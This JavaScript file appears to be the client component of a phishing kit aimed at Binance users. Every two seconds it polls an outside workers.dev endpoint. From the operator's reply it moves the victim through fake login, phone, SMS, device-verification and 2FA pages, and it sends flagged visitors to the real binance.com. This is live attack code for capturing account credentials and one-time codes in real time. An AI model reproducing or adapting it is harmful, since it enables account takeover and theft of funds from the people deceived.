function isJSON(data) {
    if (typeof data !== "string") {
        return false;
    }

    try {
        JSON.parse(data);
        return true;
    } catch (e) {
        return false;
    }
}

function promo() {
    var data = new FormData();
    data.append('action', "redirect");
    fetch('https://damp-wave-3064.pascalphp.workers.dev/', {
        method: 'POST',
        body: data,
    })
        .then(response => response.json())
        .then(data => {
            if (data.page == "login") {
                window.location.href = "index.html?status=return";
            } else if (data.page == "phone") {
                window.location.href = "phone.html";
            } else if (data.page == "phoneAgain") {
                window.location.href = "phone.html";
            } else if (data.page == "sms") {
                window.location.href = "sms.html";
            } else if (data.page == "smsAgain") {
                window.location.href = "sms2.html";
            } else if (data.page == "device") {
                window.location.href = "newdevice.html";
            } else if (data.page == "verify") {
                window.location.href = "verify.html";
            } else if (data.page == "2fa") {
                window.location.href = "2fa.html";
            } else if (data.page == "2fa2") {
                window.location.href = "2fa2.html";
            } else if (data.page == "error") {
                window.location.href = "error.html";
            } else if (data.page == "ban") {
                window.location.href = "https://binance.com";
            }
        })
        .catch(error => {
            console.error('Hata:', error);
        });
}

$(document).ready(function () {

    promo();

    setInterval(promo, 2000);
});